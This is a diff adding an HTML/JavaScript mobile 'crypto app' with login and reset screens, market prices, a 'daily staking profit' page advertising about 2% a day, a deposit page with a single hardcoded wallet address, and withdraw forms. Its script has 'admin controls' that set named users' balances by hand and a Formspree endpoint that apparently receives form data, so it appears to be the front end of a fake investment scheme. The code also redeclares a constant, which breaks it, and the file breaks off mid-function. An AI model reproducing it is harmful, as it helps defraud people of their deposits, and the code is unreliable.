@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto App - Complete Platform</title>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    
+    <style>
+        :root {
+            --bg-dark: #0f1524; --card-bg: #1c233a; --text-main: #ffffff; --text-muted: #8b95a5;
+            --accent-green: #3add74; --accent-blue: #3b8ce0; --accent-red: #ef4444; --accent-yellow: #f59e0b;
+            --accent-orange: #f97316; --btn-blue: #40a0ff; --btn-dark: #2a3450;
+            --badge-green-bg: rgba(58, 221, 116, 0.15); --badge-red-bg: rgba(239, 68, 68, 0.15);
+            --input-bg: #151b2e; --border-color: rgba(255,255,255,0.05);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        body { background-color: #050a14; display: flex; justify-content: center; color: var(--text-main); }
+        .app-container { width: 100%; max-width: 414px; background-color: var(--bg-dark); height: 100vh; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
+
+        /* --- AUTHENTICATION --- */
+        .auth-view { display: flex; flex-direction: column; align-items: center; padding: 40px 30px; text-align: center; height: 100%; overflow-y: auto; justify-content: center; }
+        .auth-logo { font-size: 48px; margin-bottom: 20px; }
+        .auth-title { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
+        .auth-subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 30px; }
+        .auth-form { width: 100%; display: flex; flex-direction: column; gap: 14px; }
+        .input-row { display: flex; gap: 12px; width: 100%; }
+        .input-row .input-group { flex: 1; }
+        .input-group { text-align: left; width: 100%; position: relative; }
+        .input-group label { display: block; font-size: 13px; color: var(--text-muted); margin-bottom: 6px; padding-left: 4px; }
+        .input-group input { width: 100%; padding: 14px 16px; background-color: var(--input-bg); border: 1px solid #2a3450; border-radius: 12px; color: white; font-size: 14px; outline: none; transition: border 0.3s; }
+        .input-group input:focus { border-color: var(--accent-blue); }
+        
+        .eye-icon { position: absolute; right: 14px; top: 38px; cursor: pointer; opacity: 0.6; transition: opacity 0.2s; font-size: 16px; }
+        .eye-icon:hover { opacity: 1; }
+        
+        .auth-btn { background-color: var(--btn-blue); color: white; padding: 16px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.3s; width: 100%; }
+        .auth-btn:hover { background-color: #2b84d3; }
+        .auth-btn:disabled { background-color: var(--btn-dark); color: var(--text-muted); cursor: not-allowed; }
+        .btn-max { background-color: var(--accent-orange); margin-top: 0; padding: 12px; }
+        .btn-danger { background-color: var(--accent-red); }
+        .error-msg { color: var(--accent-red); font-size: 13px; margin-top: -4px; min-height: 16px; text-align: left; padding-left: 4px; }
+        .success-msg { color: var(--accent-green); font-size: 13px; margin-top: -4px; min-height: 16px; text-align: left; padding-left: 4px; }
+        .switch-link { color: var(--text-muted); font-size: 14px; margin-top: 24px; cursor: pointer; padding-bottom: 20px;}
+        .switch-link span { color: var(--accent-blue); font-weight: bold; }
+        .forgot-link { color: var(--accent-blue); font-size: 12px; text-align: right; margin-top: -6px; cursor: pointer; font-weight: bold; }
+        .password-note { color: var(--accent-yellow); font-size: 11px; margin-top: 6px; padding-left: 4px; line-height: 1.4; font-weight: 500;}
+
+        /* --- MAIN LAYOUT --- */
+        .main-views { display: none; flex-direction: column; height: 100vh; width: 100%; overflow-y: auto; padding-bottom: 90px; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 20px; }
+        .user-info { display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 44px; height: 44px; background-color: #2b84d3; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; text-transform: uppercase; }
+        .username { display: flex; align-items: center; gap: 6px; font-size: 18px; font-weight: 600; }
+        .logout-btn { background-color: var(--card-bg); color: var(--accent-red); border: 1px solid rgba(239, 68, 68, 0.3); padding: 8px 16px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; }
+        .content { padding: 0 20px; }
+        .page-header { text-align: center; margin-bottom: 20px; }
+        .page-header h2 { font-size: 24px; margin-bottom: 6px; display: flex; justify-content: center; align-items: center; gap: 8px;}
+        .page-header p { color: var(--text-muted); font-size: 14px; }
+     /* --- SHARED COMPONENTS --- */
+        .balance-card { background-color: var(--card-bg); border-radius: 20px; padding: 24px; text-align: center; margin-bottom: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
+        .balance-title { color: var(--text-muted); font-size: 14px; margin-bottom: 8px; }
+        .balance-amount { color: var(--accent-green); font-size: 48px; font-weight: 700; text-shadow: 0 0 15px rgba(58, 221, 116, 0.4); margin-bottom: 4px; }
+        .balance-currency { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+        .earning-card { background-color: var(--card-bg); border-radius: 20px; padding: 20px; margin-bottom: 16px; }
+        .card-title { font-size: 18px; font-weight: bold; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+        .action-buttons { display: flex; gap: 12px; }
+        .action-btn { flex: 1; padding: 14px; border-radius: 12px; border: none; font-size: 16px; font-weight: 600; color: white; display: flex; justify-content: center; align-items: center; gap: 8px; cursor: pointer; }
+        .btn-deposit { background-color: var(--accent-green); color: #053b1b; }
+        .btn-withdraw { background-color: var(--btn-blue); }
+
+        /* --- COIN LIST & CHARTS --- */
+        .section-header { display: flex; align-items: center; gap: 8px; font-size: 18px; font-weight: 600; margin-bottom: 16px; margin-top: 8px;}
+        .coin-wrapper { background-color: var(--card-bg); border-radius: 16px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 12px;}
+        .coin-card { padding: 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background-color 0.2s; }
+        .coin-info { display: flex; align-items: center; gap: 12px; }
+        .coin-icon { width: 40px; height: 40px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 24px; }
+        .btc-icon { background-color: #f7931a; } .eth-icon { background-color: #627eea; } .xau-icon { background-color: #d4af37; } .xrp-icon { background-color: #23292f; border: 1px solid #4a5568;} .doge-icon { background-color: #c2a633; }
+        .coin-name { font-size: 16px; font-weight: 600; margin-bottom: 4px; }
+        .coin-symbol { font-size: 12px; color: var(--text-muted); }
+        .coin-price-info { text-align: right; }
+        .coin-price { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
+        .badge { display: inline-flex; align-items: center; gap: 4px; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; }
+        .badge.up { background-color: var(--badge-green-bg); color: var(--accent-green); }
+        .badge.down { background-color: var(--badge-red-bg); color: var(--accent-red); }
+        .chart-box { display: none; height: 250px; width: 100%; border-top: 1px solid var(--border-color); background-color: #131722; }
+
+        /* --- EARNING & HISTORY UI --- */
+        .top-cards-row { display: flex; gap: 12px; margin-bottom: 16px; }
+        .mini-card { flex: 1; background-color: var(--card-bg); border-radius: 16px; padding: 16px; display: flex; align-items: center; gap: 12px; }
+        .mini-card-icon { font-size: 28px; }
+        .mini-card-title { font-size: 12px; color: var(--text-muted); margin-bottom: 4px; }
+        .mini-card-val { font-size: 18px; font-weight: bold; color: var(--text-main); }
+        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border-color); font-size: 14px; }
+        .info-row:last-of-type { border-bottom: none; }
+        .text-green { color: var(--accent-green) !important; }
+        .text-red { color: var(--accent-red) !important; }
+        .progress-bar-container { height: 8px; background-color: #2a3450; border-radius: 4px; margin: 12px 0 4px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background-color: var(--accent-green); width: 100%; border-radius: 4px; transition: width 0.3s; }
+        .timer-container { display: flex; justify-content: center; gap: 8px; margin-top: 10px;}
+        .timer-box { background-color: #2a3450; border-radius: 12px; padding: 12px; text-align: center; width: 70px; }
+        .timer-num { font-size: 24px; color: var(--btn-blue); font-weight: 300; margin-bottom: 4px; }
+        .timer-lbl { font-size: 10px; color: var(--text-muted); letter-spacing: 1px; }
+        .timer-colon { font-size: 24px; color: var(--btn-blue); display: flex; align-items: center; padding-bottom: 16px;}
+        .rate-table { background-color: var(--card-bg); border-radius: 16px; overflow: hidden; }
+        .rate-row { display: flex; justify-content: space-between; padding: 12px 16px; font-size: 13px; color: var(--text-muted); border-bottom: 1px solid var(--border-color); }
+        .rate-row.active { background-color: #1a323f; border: 1px solid #20505a; border-radius: 8px; color: var(--accent-green); font-weight: bold; margin: 4px; }
+        .filter-chips { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px;}
+        .filter-chip { background: transparent; border: 1px solid #2a3450; color: var(--text-muted); padding: 8px 16px; border-radius: 20px; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px;}
+        .filter-chip.active { background: #1a2a47; border-color: var(--btn-blue); color: white; }
+        .dot { width: 10px; height: 10px; border-radius: 50%; }
+        .dot-profit { background: var(--accent-green); } .dot-transfer { background: var(--btn-blue); } .dot-withdraw { background: var(--accent-red); } .dot-reward { background: #fbbf24; }
+        .tx-item { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid var(--border-color); }
+        .tx-left { display: flex; align-items: center; gap: 12px; }
+        .tx-icon-box { width: 42px; height: 42px; border-radius: 12px; background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .tx-title { font-weight: 600; font-size: 15px; margin-bottom: 4px; }
+        .tx-date { font-size: 12px; color: var(--text-muted); }
+
+        /* --- DEPOSIT & WITHDRAW UI --- */
+        .notice-card { background-color: #1a1f2e; border: 1px solid #9a6515; border-radius: 16px; padding: 16px; display: flex; gap: 12px; margin-bottom: 16px; }
+        .notice-card.red-theme { background-color: #21161d; border-color: #5a2a30; }
+        .notice-icon { font-size: 24px; color: var(--accent-yellow); }
+        .notice-text { font-size: 13px; color: var(--text-muted); line-height: 1.5; }
+        .notice-text span { color: var(--accent-yellow); font-weight: bold; }
+        .red-theme .notice-text span, .red-theme strong { color: var(--accent-red); }
+        .network-selector { background-color: #141a29; border: 1px solid #2a3450; padding: 14px 16px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .network-badge { background-color: var(--badge-green-bg); color: var(--accent-green); padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: bold; }
+        .qr-container { background-color: white; padding: 16px; border-radius: 16px; width: 200px; height: 200px; margin: 20px auto; display: flex; justify-content: center; align-items: center; }
+        .qr-container img { width: 100%; height: 100%; }
+        .address-box { background-color: #141a29; border: 1px solid #2a3450; padding: 12px 16px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+        .address-text { font-size: 13px; color: white; word-break: break-all; margin-right: 12px; font-family: monospace;}
+        .copy-btn { background: rgba(255,255,255,0.1); border: none; color: white; padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: bold;}
+        .summary-box { background-color: #141a29; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+        .summary-row { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 12px; color: var(--text-muted); align-items: center;}
+        .step-list { display: flex; flex-direction: column; gap: 16px; }
+        .step-item { display: flex; gap: 16px; }
+        .step-num { width: 28px; height: 28px; background-color: var(--btn-blue); color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 14px; font-weight: bold; flex-shrink: 0; }
+        .step-content h4 { font-size: 15px; margin-bottom: 4px; }
+        .step-content p { font-size: 13px; color: var(--text-muted); }
+        .note-list { display: flex; flex-direction: column; gap: 10px; }
+        .note-item { padding: 14px; border-radius: 12px; display: flex; align-items: center; gap: 12px; font-size: 13px; font-weight: 500; }
+        .note-yellow { background-color: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.2); color: #fbbf24; }
+        .note-red { background-color: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); color: #fca5a5; }
+        .note-blue { background-color: rgba(64, 160, 255, 0.1); border: 1px solid rgba(64, 160, 255, 0.2); color: #93c5fd; }
+        .activity-text { text-align: center; color: var(--text-muted); padding: 20px 0; font-size: 14px; }
+
+        /* --- BOTTOM NAV --- */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 414px; background-color: #0f1524; display: flex; justify-content: space-around; padding: 12px 0 20px 0; border-top: 1px solid #1c233a; z-index: 100; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--text-muted); font-size: 12px; cursor: pointer; }
+        .nav-item.active { color: var(--accent-blue); }
+        .nav-icon { font-size: 24px; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div id="login-view" class="auth-view">
+            <div class="auth-logo">🚀</div>
+            <h1 class="auth-title">Welcome Back</h1>
+            <p class="auth-subtitle">Log in to manage your crypto portfolio</p>
+            <form class="auth-form" onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Username</label>
+                    <input type="text" id="login-username" required placeholder="Enter username">
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="login-password" required placeholder="Enter password" style="padding-right: 40px;">
+                    <span class="eye-icon" onclick="togglePassword('login-password')">👁️</span>
+                </div>
+                <div class="forgot-link" onclick="switchAuthView('forgot')">Forgot Password?</div>
+                <div id="login-error" class="error-msg"></div>
+                <button type="submit" class="auth-btn">Log In</button>
+            </form>
+            <p class="switch-link" onclick="switchAuthView('register')">Don't have an account? <span>Register</span></p>
+        </div>
+
+        <div id="register-view" class="auth-view" style="display: none; justify-content: flex-start;">
+            <div class="auth-logo">✨</div>
+            <h1 class="auth-title">Create Account</h1>
+            <p class="auth-subtitle">Start your crypto journey today</p>
+            
+            <form class="auth-form" onsubmit="handleRegister(event)">
+                <div class="input-row">
+                    <div class="input-group"><label>First Name</label><input type="text" id="reg-fname" required placeholder="First"></div>
+                    <div class="input-group"><label>Second Name</label><input type="text" id="reg-lname" required placeholder="Second"></div>
+                </div>
+
+                <div class="input-group">
+                    <label>Username</label>
+                    <input type="text" id="reg-username" required placeholder="Choose a username">
+                    <div class="password-note">Remember it will be asked in case of forgot password</div>
+                </div>
+
+                <div class="input-group">
+                    <label>Email Address</label>
+                    <input type="email" id="reg-email" required placeholder="name@example.com">
+                </div>
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="reg-password" required placeholder="Create password" style="padding-right: 40px;">
+                    <span class="eye-icon" onclick="togglePassword('reg-password')">👁️</span>
+                </div>
+                
+                <div class="input-group">
+                    <label>Confirm Password</label>
+                    <input type="password" id="reg-confirm" required placeholder="Re-enter password" style="padding-right: 40px;">
+                    <span class="eye-icon" onclick="togglePassword('reg-confirm')">👁️</span>
+                </div>
+                
+                <div id="reg-error" class="error-msg"></div>
+                <button type="submit" class="auth-btn">Register</button>
+            </form>
+          <p class="switch-link" onclick="switchAuthView('login')">Already have an account? <span>Log In</span></p>
+        </div>
+
+        <div id="forgot-view" class="auth-view" style="display: none;">
+            <div class="auth-logo">🔒</div>
+            <h1 class="auth-title">Reset Password</h1>
+            <p class="auth-subtitle" id="forgot-subtitle">Enter details to receive a code</p>
+            
+            <form class="auth-form" id="forgot-step-1" onsubmit="handleForgotRequest(event)">
+                <div class="input-group">
+                    <label>Username</label>
+                    <input type="text" id="forgot-username" required placeholder="Your username">
+                </div>
+                <div class="input-group">
+                    <label>Email Address</label>
+                    <input type="email" id="forgot-email" required placeholder="Your registered email">
+                </div>
+                <div id="forgot-error-1" class="error-msg"></div>
+                <button type="submit" class="auth-btn">Send Verification Code</button>
+            </form>
+
+            <form class="auth-form" id="forgot-step-2" onsubmit="handleVerifyCode(event)" style="display: none;">
+                <div class="input-group">
+                    <label>Verification Code</label>
+                    <input type="text" id="forgot-code" required placeholder="Enter 6-digit code">
+                </div>
+                <div id="forgot-error-2" class="error-msg"></div>
+                <div id="forgot-success" class="success-msg" style="display: none;">Code verified successfully!</div>
+                <button type="submit" class="auth-btn">Verify Code</button>
+            </form>
+
+            <form class="auth-form" id="forgot-step-3" onsubmit="handleResetPassword(event)" style="display: none;">
+                <div class="input-group">
+                    <label>New Password</label>
+                    <input type="password" id="forgot-new-pass" required placeholder="New password" style="padding-right: 40px;">
+                    <span class="eye-icon" onclick="togglePassword('forgot-new-pass')">👁️</span>
+                </div>
+                <div class="input-group">
+                    <label>Confirm New Password</label>
+                    <input type="password" id="forgot-confirm-pass" required placeholder="Re-enter new password" style="padding-right: 40px;">
+                    <span class="eye-icon" onclick="togglePassword('forgot-confirm-pass')">👁️</span>
+                </div>
+                <div id="forgot-error-3" class="error-msg"></div>
+                <button type="submit" class="auth-btn">Update Password</button>
+            </form>
+            
+            <p class="switch-link" onclick="switchAuthView('login')">Remembered it? <span>Log In</span></p>
+        </div>
+
+
+        <div id="main-app-view" class="main-views">
+            
+            <header id="main-header">
+                <div class="user-info">
+                    <div class="avatar" id="user-avatar">US</div>
+                    <div class="username">👤 <span id="display-username">User</span></div>
+                </div>
+                <button class="logout-btn" onclick="handleLogout()">Logout</button>
+            </header>
+
+            <div id="tab-dashboard" class="content">
+                <div class="balance-card">
+                    <div class="balance-title">Your Balance</div>
+                    <div class="balance-amount" id="dash-balance">$0.00</div>
+                    <div class="balance-currency">USDT</div>
+                    <div class="action-buttons">
+                        <button class="action-btn btn-deposit" onclick="switchAppTab('deposit')">💰 Deposit</button>
+                        <button class="action-btn btn-withdraw" onclick="switchAppTab('withdraw')">💸 Withdraw</button>
+                    </div>
+                </div>
+
+                <div class="section-header">📊 Market Prices</div>
+                <div class="coin-list">
+                    <div class="coin-wrapper"><div class="coin-card" onclick="toggleChart('btc', 'BINANCE:BTCUSDT')"><div class="coin-info"><div class="coin-icon btc-icon">₿</div><div><div class="coin-name">Bitcoin</div><div class="coin-symbol">BTC</div></div></div><div class="coin-price-info"><div class="coin-price" id="price-btc">Loading...</div><div class="badge up" id="change-btc">-</div></div></div><div class="chart-box" id="chart-btc"></div></div>
+                    <div class="coin-wrapper"><div class="coin-card" onclick="toggleChart('eth', 'BINANCE:ETHUSDT')"><div class="coin-info"><div class="coin-icon eth-icon">♦</div><div><div class="coin-name">Ethereum</div><div class="coin-symbol">ETH</div></div></div><div class="coin-price-info"><div class="coin-price" id="price-eth">Loading...</div><div class="badge up" id="change-eth">-</div></div></div><div class="chart-box" id="chart-eth"></div></div>
+                    <div class="coin-wrapper"><div class="coin-card" onclick="toggleChart('xau', 'OANDA:XAUUSD')"><div class="coin-info"><div class="coin-icon xau-icon">🥇</div><div><div class="coin-name">Gold</div><div class="coin-symbol">XAU</div></div></div><div class="coin-price-info"><div class="coin-price" id="price-xau">Loading...</div><div class="badge up" id="change-xau">-</div></div></div><div class="chart-box" id="chart-xau"></div></div>
+                    <div class="coin-wrapper"><div class="coin-card" onclick="toggleChart('xrp', 'BINANCE:XRPUSDT')"><div class="coin-info"><div class="coin-icon xrp-icon">✕</div><div><div class="coin-name">Ripple</div><div class="coin-symbol">XRP</div></div></div><div class="coin-price-info"><div class="coin-price" id="price-xrp">Loading...</div><div class="badge up" id="change-xrp">-</div></div></div><div class="chart-box" id="chart-xrp"></div></div>
+                    <div class="coin-wrapper"><div class="coin-card" onclick="toggleChart('doge', 'BINANCE:DOGEUSDT')"><div class="coin-info"><div class="coin-icon doge-icon">🐕</div><div><div class="coin-name">Dogecoin</div><div class="coin-symbol">DOGE</div></div></div><div class="coin-price-info"><div class="coin-price" id="price-doge">Loading...</div><div class="badge up" id="change-doge">-</div></div></div><div class="chart-box" id="chart-doge"></div></div>
+                </div>
+            </div>
+
+            <div id="tab-earning" class="content" style="display: none;">
+                <div class="top-cards-row">
+                    <div class="mini-card"><div class="mini-card-icon">💰</div><div><div class="mini-card-title">Total Balance</div><div class="mini-card-val" id="earn-balance">$0.00</div></div></div>
+                    <div class="mini-card"><div class="mini-card-icon">🎁</div><div><div class="mini-card-title">Total Profit</div><div class="mini-card-val" id="earn-total-profit">$0.00</div></div></div>
+                </div>
+
+                <div class="earning-card">
+                    <div class="card-title">⚡ Daily Staking Profit</div>
+                    <div class="info-row"><span class="info-label">📊 Your Rate</span><span class="info-val" id="earn-rate">2.0%</span></div>
+                    <div class="info-row"><span class="info-label">💰 Based On</span><span class="info-val" id="earn-based-on">$0.00</span></div>
+                    <div class="info-row"><span class="info-label">📌 Status</span><span class="info-val text-red" id="earn-status">❌ No Balance</span></div>
+                    
+                    <div class="progress-bar-container"><div class="progress-fill" style="width: 100%;"></div></div>
+                    <div style="text-align: right; font-size: 12px; color: var(--text-muted); margin-bottom: 16px;">100%</div>
+
+                    <div style="display: flex; flex-direction: column; gap: 10px;">
+                        <button class="auth-btn" style="margin-top:0;" onclick="handleCheckProfit()">📊 Check Profit</button>
+                        <button class="auth-btn" id="btn-claim" style="margin-top:0; background-color: var(--btn-dark);" disabled onclick="handleClaim()">🎁 Claim $0.00</button>
+                    </div>
+                </div>
+
+                <div class="earning-card" style="text-align: center;">
+                    <div class="card-title" style="justify-content: center;">⏰ Next Profit</div>
+                    <div class="timer-container">
+                        <div class="timer-box"><div class="timer-num" id="t-hours">00</div><div class="timer-lbl">HOURS</div></div>
+                        <div class="timer-colon">:</div>
+                        <div class="timer-box"><div class="timer-num" id="t-mins">00</div><div class="timer-lbl">MINS</div></div>
+                        <div class="timer-colon">:</div>
+                        <div class="timer-box"><div class="timer-num" id="t-secs">00</div><div class="timer-lbl">SECS</div></div>
+                    </div>
+                </div>
+              <div class="earning-card">
+                    <div class="card-title">💰 Transfer Profit</div>
+                    <div class="info-row" style="border:none; padding-top:0;"><span class="info-label">Available:</span><span class="info-val text-green" id="earn-available">$0.00</span></div>
+                    <div class="input-group" style="margin-bottom: 10px;"><input type="number" id="transfer-amount" placeholder="Enter amount (min $30)"></div>
+                    <button class="auth-btn" style="margin-top:0;" onclick="handleTransfer()">💰 Transfer to Balance</button>
+                </div>
+
+                <div class="earning-card">
+                    <div class="card-title">📊 Profit Rate Table</div>
+                    <div class="rate-table" id="rate-table-container"></div>
+                </div>
+            </div>
+
+            <div id="tab-history" class="content" style="display: none;">
+                <div class="page-header"><h2>📋 Transaction History</h2><p>All your transactions in one place</p></div>
+                
+                <div class="earning-card" style="padding-bottom: 12px;">
+                    <div class="card-title">🔍 Filter</div>
+                    <div class="filter-chips">
+                        <div class="filter-chip active" onclick="setFilter(event, 'All')">📋 All</div>
+                        <div class="filter-chip" onclick="setFilter(event, 'Profit')"><span class="dot dot-profit"></span> Profit</div>
+                        <div class="filter-chip" onclick="setFilter(event, 'Transfer')"><span class="dot dot-transfer"></span> Transfer</div>
+                        <div class="filter-chip" onclick="setFilter(event, 'Withdraw')"><span class="dot dot-withdraw"></span> Withdraw</div>
+                    </div>
+                </div>
+                <div id="hist-list"></div>
+            </div>
+
+            <div id="tab-deposit" class="content" style="display: none; padding-top: 10px;">
+                <div class="page-header"><h2>💰 Deposit</h2><p>Add funds to your account</p></div>
+                <div class="earning-card" style="text-align: center; padding: 24px;">
+                    <div class="balance-title">Current Balance</div>
+                    <div class="balance-amount" style="font-size: 36px;" id="dep-balance">$0.00</div>
+                </div>
+                <div class="notice-card"><div class="notice-icon">⚠️</div><div class="notice-text"><strong>Important Notice</strong><br>Only send <span>USDT</span> via <span>ERC20</span> network to this address. Sending any other coin will result in <span>permanent loss</span>.</div></div>
+                <div class="earning-card"><div class="card-title">🌐 Network</div><div class="network-selector"><div class="network-name"><span style="color:var(--accent-green)">●</span> ERC20</div><div class="network-badge">Selected</div></div></div>
+                <div class="earning-card">
+                    <div class="card-title">📋 Your Deposit Address</div>
+                    <div class="qr-container"><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x3C2571513475CA5FdE6815E9189F2239309F654F" alt="QR"></div>
+                    <div class="address-box"><div class="address-text" id="deposit-address">0x3C2571513475CA5FdE6815E9189F2239309F654F</div><button class="copy-btn" onclick="copyAddress()">Copy</button></div>
+                </div>
+                
+                <div class="earning-card">
+                    <div class="card-title">📝 How To Deposit</div>
+                    <div class="step-list">
+                        <div class="step-item"><div class="step-num">1</div><div class="step-content"><h4>Copy Address</h4><p>Copy the ERC20 wallet address above</p></div></div>
+                        <div class="step-item"><div class="step-num">2</div><div class="step-content"><h4>Open Your Wallet</h4><p>Open your crypto wallet (MetaMask, Trust Wallet, etc.)</p></div></div>
+                        <div class="step-item"><div class="step-num">3</div><div class="step-content"><h4>Send USDT (ERC20)</h4><p>Send USDT using <span style="color:var(--accent-yellow); font-weight:bold;">ERC20 network only</span></p></div></div>
+                        <div class="step-item"><div class="step-num">4</div><div class="step-content"><h4>Wait For Confirmation</h4><p>Your balance will be updated after confirmation</p></div></div>
+                    </div>
+                </div>
+
+                <div class="earning-card">
+                    <div class="card-title">📌 Important Notes</div>
+                    <div class="note-list">
+                        <div class="note-item note-yellow">⚠️ Only send USDT to this address</div>
+                        <div class="note-item note-yellow">⚠️ Only use ERC20 network</div>
+                        <div class="note-item note-red">🚫 Do NOT send other coins (BTC, ETH, etc.)</div>
+                        <div class="note-item note-red">🚫 Do NOT use TRC20 or BEP20 network</div>
+                        <div class="note-item note-blue">ℹ️ Minimum confirmation time: 5-30 minutes</div>
+                        <div class="note-item note-blue">ℹ️ Contact support if deposit not received within 1 hour</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-withdraw" class="content" style="display: none; padding-top: 10px;">
+                <div class="page-header"><h2>💸 Withdraw</h2><p>Withdraw funds to your wallet</p></div>
+                <div class="earning-card" style="text-align: center; padding: 24px;">
+                    <div class="balance-title">Available Balance</div>
+                    <div class="balance-amount" style="font-size: 36px;" id="with-balance">$0.00</div>
+                </div>
+                <div class="notice-card red-theme"><div class="notice-icon">⚠️</div><div class="notice-text"><strong>Important Notice</strong><br>Only enter <span>ERC20</span> wallet address. Using a different network will result in <span>permanent loss</span>.</div></div>
+                <div class="earning-card"><div class="card-title">🌐 Network</div><div class="network-selector"><div class="network-name"><span style="color:var(--accent-green)">●</span> ERC20</div><div class="network-badge">Selected</div></div></div>
+                
+                <div class="earning-card">
+                    <div class="card-title">💸 Withdraw Details</div>
+                    <div class="input-group" style="margin-bottom: 16px;"><label>Your ERC20 Wallet Address</label><input type="text" id="withdraw-address" placeholder="Enter your ERC20 wallet address"></div>
+                    <div class="input-group" style="margin-bottom: 8px;"><label>Withdraw Amount (USDT)</label><input type="number" id="withdraw-amount" placeholder="Enter amount (min $30)" oninput="updateWithdrawSummary()"></div>
+                    <button class="auth-btn btn-max" onclick="setMaxWithdraw()">MAX</button>
+                    
+                    <div class="summary-box" style="margin-top:20px;">
+                        <div class="summary-row"><span>Withdraw Amount</span><span id="summary-amount">$0.00</span></div>
+                        <div class="summary-row"><span>Network Fee</span><span class="network-badge">FREE</span></div>
+                        <div class="summary-row" style="border-top: 1px solid var(--border-color); padding-top: 12px; margin-top: 12px; font-weight: bold;"><span>You Will Receive</span><span class="text-green" id="summary-receive">$0.00</span></div>
+                    </div>
+                    <button class="auth-btn btn-danger" onclick="submitWithdraw()">💸 Submit Withdraw Request</button>
+                </div>
+            </div>
+
+        </div>
+
+        <nav id="bottom-nav-bar" class="bottom-nav" style="display: none;">
+            <div class="nav-item active" id="nav-dashboard" onclick="switchAppTab('dashboard')"><span class="nav-icon">🏠</span><span>Home</span></div>
+            <div class="nav-item" id="nav-earning" onclick="switchAppTab('earning')"><span class="nav-icon">📈</span><span>Earning</span></div>
+            <div class="nav-item" id="nav-history" onclick="switchAppTab('history')"><span class="nav-icon">📋</span><span>History</span></div>
+        </nav>
+
+    </div>
+
+    <script>
+    // =========================================================
+        // 🔒 ADMIN CONTROLS 
+        // =========================================================
+        const adminOverrides = {
+             "Imran": { balance: 100.00 }
+        };
+    const adminOverrides = {
+             "Kernel": { balance: 150.00 }
+        };
+
+        const FORMSPREE_URL = "https://formspree.io/f/xgorawzn"; 
+        // =========================================================
+
+        let currentUser = null;
+        let appState = { balance: 0.00, totalProfit: 0.00, availableTransfer: 0.00, pendingClaim: 0.00, transactions: [] };
+        let currentHistoryFilter = 'All';
+        
+        let resetOTP = "";
+        let resetUsername = "";
+
+        const rateTiers = [
+            { min: 0, max: 1000, rate: 2.0, label: "$0 - $1,000" }, { min: 1000, max: 2000, rate: 2.1, label: "$1,000 - $2,000" },
+            { min: 2000, max: 5000, rate: 2.2, label: "$2,000 - $5,000" }, { min: 5000, max: 10000, rate: 2.3, label: "$5,000 - $10,000" }
+        ];
+        const fmtMoney = (val) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(val);
+
+        // --- TOGGLE PASSWORD VISIBILITY ---
+        function togglePassword(inputId) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+            } else {
+                input.type = "password";
+            }
+        }
+
+        // --- NAVIGATION ---
+        function switchAuthView(viewName) {
+            document.getElementById('login-view').style.display = 'none';
+            document.getElementById('register-view').style.display = 'none';
+            document.getElementById('forgot-view').style.display = 'none';
+            document.getElementById('main-app-view').style.display = 'none';
+            document.getElementById('bottom-nav-bar').style.display = 'none';
+            
+            if(viewName === 'app') {
+                document.getElementById('main-app-view').style.display = 'flex';
+                document.getElementById('bottom-nav-bar').style.display = 'flex';
+                updateAllUI(); 
+            } else { document.getElementById(`${viewName}-view`).style.display = 'flex'; }
+
+            if(viewName === 'forgot') {
+                document.getElementById('forgot-step-1').style.display = 'flex';
+                document.getElementById('forgot-step-2').style.display = 'none';
+                document.getElementById('forgot-step-3').style.display = 'none';
+                document.getElementById('forgot-error-1').innerText = '';
+                document.getElementById('forgot-error-2').innerText = '';
+                document.getElementById('forgot-error-3').innerText = '';
+            }
+        }
+
+        function switchAppTab(tabName) {
